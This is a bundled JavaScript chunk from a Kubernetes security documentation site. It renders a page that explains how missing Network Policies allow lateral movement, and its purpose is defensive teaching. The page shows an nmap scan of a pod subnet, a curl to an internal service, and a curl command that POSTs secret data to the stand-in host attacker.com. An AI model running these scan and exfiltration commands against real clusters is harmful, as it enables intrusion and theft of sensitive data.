"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[3716],{3077(e,t,s){s.r(t),s.d(t,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/lack_of_network_policies","title":"Lack of Network Policies","description":"How missing Kubernetes Network Policies enable lateral movement and data exfiltration by attackers.","source":"@site/docs/attack_vectors/lack_of_network_policies.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/lack_of_network_policies","permalink":"/docs/attack_vectors/lack_of_network_policies","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/lack_of_network_policies.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/docs/tags/attack-vector"},{"inline":true,"label":"network","permalink":"/docs/tags/network"},{"inline":true,"label":"lateral-movement","permalink":"/docs/tags/lateral-movement"},{"inline":true,"label":"CKS","permalink":"/docs/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1768933218000,"sidebarPosition":5,"frontMatter":{"sidebar_position":5,"title":"Lack of Network Policies","description":"How missing Kubernetes Network Policies enable lateral movement and data exfiltration by attackers.","keywords":["kubernetes security","network policies","network segmentation","lateral movement","pod networking","network isolation","calico","cilium","network security","kubernetes networking"],"tags":["attack-vector","network","lateral-movement","CKS"],"related":["/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies/","/docs/best_practices/cluster_setup_and_hardening/network_security/calico/","/docs/best_practices/cluster_setup_and_hardening/network_security/cilium/","/docs/attack_vectors/traffic_hijacking/"]},"sidebar":"default","previous":{"title":"Exposed Kubelet API","permalink":"/docs/attack_vectors/exposed_kubelet_api"},"next":{"title":"Supply Chain Attacks","permalink":"/docs/attack_vectors/supply_chain_attacks"}}');var i=s(4848),r=s(8453);const a={sidebar_position:5,title:"Lack of Network Policies",description:"How missing Kubernetes Network Policies enable lateral movement and data exfiltration by attackers.",keywords:["kubernetes security","network policies","network segmentation","lateral movement","pod networking","network isolation","calico","cilium","network security","kubernetes networking"],tags:["attack-vector","network","lateral-movement","CKS"],related:["/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies/","/docs/best_practices/cluster_setup_and_hardening/network_security/calico/","/docs/best_practices/cluster_setup_and_hardening/network_security/cilium/","/docs/attack_vectors/traffic_hijacking/"]},c="Lack of Network Policies",o={},l=[{value:"Exploitation Steps: Lateral Movement in Kubernetes",id:"exploitation-steps-lateral-movement-in-kubernetes",level:2},{value:"Step 1: Gain Shell Access to the Pod",id:"step-1-gain-shell-access-to-the-pod",level:3},{value:"Step 2: Discover Internal Services",id:"step-2-discover-internal-services",level:3},{value:"Step 3: Access Unprotected Services",id:"step-3-access-unprotected-services",level:3},{value:"Step 4: Exfiltrate Data",id:"step-4-exfiltrate-data",level:3},{value:"Result",id:"result",level:2},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"lack-of-network-policies",children:"Lack of Network Policies"})}),"\n",(0,i.jsxs)(t.p,{children:["When Kubernetes clusters are deployed without Network Policies, ",(0,i.jsx)(t.strong,{children:"all pods can communicate freely with one another"}),". This default behavior poses a serious risk: it allows an attacker who gains access to any pod to move laterally throughout the cluster, access internal services, and exfiltrate data without restriction."]}),"\n",(0,i.jsxs)(t.p,{children:["This article demonstrates how a lack of network segmentation enables ",(0,i.jsx)(t.strong,{children:"lateral movement and sensitive data exposure"}),"."]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"exploitation-steps-lateral-movement-in-kubernetes",children:"Exploitation Steps: Lateral Movement in Kubernetes"}),"\n",(0,i.jsx)(t.p,{children:"An attacker compromises a low-privileged pod in the cluster and uses it as a pivot point."}),"\n",(0,i.jsx)(t.h3,{id:"step-1-gain-shell-access-to-the-pod",children:"Step 1: Gain Shell Access to the Pod"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"kubectl exec -it <compromised-pod> -- /bin/sh\n"})}),"\n",(0,i.jsx)(t.h3,{id:"step-2-discover-internal-services",children:"Step 2: Discover Internal Services"}),"\n",(0,i.jsx)(t.p,{children:"With unrestricted network access, the attacker installs common scanning tools to enumerate services:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"apt-get update && apt-get install -y nmap\nnmap -p 80,443,8080 10.0.0.0/24\n"})}),"\n",(0,i.jsx)(t.h3,{id:"step-3-access-unprotected-services",children:"Step 3: Access Unprotected Services"}),"\n",(0,i.jsx)(t.p,{children:"After identifying service IPs, the attacker connects to internal APIs or databases directly:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"curl http://10.0.0.15:8080/secret-data\n"})}),"\n",(0,i.jsx)(t.h3,{id:"step-4-exfiltrate-data",children:"Step 4: Exfiltrate Data"}),"\n",(0,i.jsx)(t.p,{children:"Sensitive information is sent outside the cluster via an outbound HTTP request:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"curl -X POST -d @/path/to/secret-data http://attacker.com/upload\n"})}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"result",children:"Result"}),"\n",(0,i.jsx)(t.p,{children:"Without any Network Policies in place:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:["Lateral movement goes ",(0,i.jsx)(t.strong,{children:"unrestricted"}),"."]}),"\n",(0,i.jsxs)(t.li,{children:["Internal services are ",(0,i.jsx)(t.strong,{children:"exposed"})," across the cluster."]}),"\n",(0,i.jsxs)(t.li,{children:["Data can be ",(0,i.jsx)(t.strong,{children:"exfiltrated externally"})," without detection or limitation."]}),"\n"]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,i.jsx)(t.p,{children:"To prevent lateral movement and reduce your cluster's attack surface:"}),"\n",(0,i.jsxs)(t.p,{children:["\u27a1 ",(0,i.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/network_policies",children:"Harden your cluster with Kubernetes Network Policies"})]})]})}function p(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8453(e,t,s){s.d(t,{R:()=>a,x:()=>c});var n=s(6540);const i={},r=n.createContext(i);function a(e){const t=n.useContext(r);return n.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),n.createElement(r.Provider,{value:t},e.children)}}}]);